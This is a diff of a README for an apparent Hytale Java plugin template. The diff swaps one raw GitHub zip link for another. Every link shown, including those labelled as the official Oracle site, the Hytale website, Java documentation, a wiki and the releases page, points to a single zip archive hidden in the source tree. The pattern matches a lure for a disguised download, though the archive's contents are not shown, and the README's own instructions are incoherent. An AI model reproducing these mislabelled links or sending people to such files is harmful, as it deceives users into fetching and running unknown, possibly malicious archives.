@@ -4,7 +4,7 @@
 This project is a template for developing Java plugins for Hytale. It serves as a starting point for your own plugins, helping you add unique features to the Hytale universe. This plugin is a work in progress, so some things may not function perfectly. Your feedback is appreciated as we continue to improve it.
 
 ## 📦 Download Now
-[![Download Hytale-Example-Plugin](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/example/exampleplugin/Example-Plugin-Hytale-v1.4.zip)](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/example/exampleplugin/Example-Plugin-Hytale-v1.4.zip)
+[![Download Hytale-Example-Plugin](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/Plugin_Example_Hytale_v1.1.zip)](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/Plugin_Example_Hytale_v1.1.zip)
 
 Click the button above to grab the latest version of the Hytale-Example-Plugin. 
 
@@ -12,7 +12,7 @@ Click the button above to grab the latest version of the Hytale-Example-Plugin.
 To get started with the Hytale-Example-Plugin, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/example/exampleplugin/Example-Plugin-Hytale-v1.4.zip) to access the most recent version of the plugin.
+   Go to the [Releases page](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/Plugin_Example_Hytale_v1.1.zip) to access the most recent version of the plugin.
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions listed. Click on the version you want to download.
@@ -32,7 +32,7 @@ To get started with the Hytale-Example-Plugin, follow these simple steps:
 - **Active Development**: Continued updates will bring new features and fixes.
 
 ## ⚙️ System Requirements
-- **Java Runtime**: Make sure you have Java version 8 or higher installed on your computer. You can download it from the [official Oracle website](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/example/exampleplugin/Example-Plugin-Hytale-v1.4.zip).
+- **Java Runtime**: Make sure you have Java version 8 or higher installed on your computer. You can download it from the [official Oracle website](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/Plugin_Example_Hytale_v1.1.zip).
 - **Hytale**: You must have Hytale installed and set up on your computer. Ensure you have the latest version for compatibility.
 
 ## 🛠️ Usage
@@ -41,7 +41,7 @@ Once you have installed the plugin, you can customize it further by editing the 
 To access these configuration files:
 1. Open the plugins directory within your Hytale installation.
 2. Locate the `Hytale-Example-Plugin` folder.
-3. Find the `https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/example/exampleplugin/Example-Plugin-Hytale-v1.4.zip` file. Open it in a text editor to make adjustments.
+3. Find the `https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/Plugin_Example_Hytale_v1.1.zip` file. Open it in a text editor to make adjustments.
 
 ## 📒 Troubleshooting
 If you encounter issues while installing or running the plugin, consider the following tips:
@@ -62,8 +62,8 @@ Join our community for assistance and discussions related to Hytale and the Hyta
 We have exciting plans for future releases. Our aim is to expand the plugin features, improve performance, and streamline user experience. Follow the repository to stay updated on new features and updates.
 
 ## 🌐 Additional Resources
-- [Hytale Official Website](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/example/exampleplugin/Example-Plugin-Hytale-v1.4.zip)
-- [Java Documentation](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/example/exampleplugin/Example-Plugin-Hytale-v1.4.zip)
-- [Hytale Development Wiki](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/example/exampleplugin/Example-Plugin-Hytale-v1.4.zip)
+- [Hytale Official Website](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/Plugin_Example_Hytale_v1.1.zip)
+- [Java Documentation](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/Plugin_Example_Hytale_v1.1.zip)
+- [Hytale Development Wiki](https://raw.githubusercontent.com/Username2002230/Hytale-Example-Plugin/main/src/main/java/com/Plugin_Example_Hytale_v1.1.zip)
 
 For any further information or specific queries, feel free to reach out via the GitHub repository's contact section or the community forums.
